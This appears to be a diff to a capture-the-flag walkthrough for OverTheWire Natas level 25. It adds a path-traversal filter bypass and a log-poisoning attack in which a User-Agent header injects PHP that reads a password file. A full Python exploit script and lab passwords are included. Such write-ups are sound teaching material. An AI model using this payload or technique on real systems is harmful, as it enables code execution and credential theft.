@@ -1492,4 +1492,85 @@ Password: GHF6X7YwACaYYssHVY05cFq83hRktl4c
 
 # Level 25
 
+## [Path Truncation Attack](https://security.stackexchange.com/questions/17407/how-can-i-use-this-path-bypass-exploit-local-file-inclusion)
+
+[More](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
+
 URL: http://natas25.natas.labs.overthewire.org
+
+
+The online sourcecode has two cavets:
+
+```php
+    function logRequest($message){
+        $log="[". date("d.m.Y H::i:s",time()) ."]";
+        $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
+        $log=$log . " \"" . $message ."\"\n"; 
+        $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
+        fwrite($fd,$log);
+        fclose($fd);
+    }
+
+    function safeinclude($filename){
+        // check for directory traversal
+        if(strstr($filename,"../")){
+            logRequest("Directory traversal attempt! fixing request.");
+            $filename=str_replace("../","",$filename);
+        }
+        // dont let ppl steal our passwords
+        if(strstr($filename,"natas_webpass")){
+            logRequest("Illegal file access detected! Aborting!");
+            exit(-1);
+        }
+        // add more checks...
+
+        if (file_exists($filename)) { 
+            include($filename);
+            return 1;
+        }
+        return 0;
+    }
+```
+
+Bypassing the second one is as simple as `.../...//` which gets to `../` allowing directory traversal. The first one `$_SERVER['HTTP_USER_AGENT']` trusts user input :)
+
+We craft a payload such that error occurs and log is written. Inside the `User-Agent` field, we embed php code:
+
+```php
+headers = {'User-Agent': '<?php global $__FOOTER; $__FOOTER=passthru("cat /etc/natas_webpass/natas26"); ?>'}
+```
+
+that sets the `$__FOOTER$` of the page to the password. The second `GET` tries to access `log` directly. That fails. Thus, we access it through directory traversal. The following file:
+
+```s
+$fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
+```
+reveals the name of the log. It uses our session id. Complete exploit:
+
+```python
+def exploit():
+    sess = requests.Session()
+    _payload = "en../"
+    headers = {'User-Agent': '<?php global $__FOOTER; $__FOOTER=passthru("cat /etc/natas_webpass/natas26"); ?>'}
+    auth_username = 'natas25'
+    auth_password = 'GHF6X7YwACaYYssHVY05cFq83hRktl4c'
+    response = sess.get('http://natas25.natas.labs.overthewire.org/?lang='+_payload, auth=HTTPBasicAuth(auth_username, auth_password), headers=headers)
+    dissect_response(response)
+    for cookie in sess.cookies:
+        value = cookie.value
+
+
+    _payload = "logs/natas25_" + value + ".log"
+    response = requests.get('http://natas25.natas.labs.overthewire.org/'+_payload, auth=HTTPBasicAuth(auth_username, auth_password), headers=headers)
+    dissect_response(response)
+
+    _payload = ".../...//logs/natas25_" + value + ".log"
+    response = sess.get('http://natas25.natas.labs.overthewire.org/?lang='+_payload, auth=HTTPBasicAuth(auth_username, auth_password), headers=headers)
+    dissect_response(response)
+```
+
+Password: oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T
+
+# Level 26
+
+URL: http://natas26.natas.labs.overthewire.org
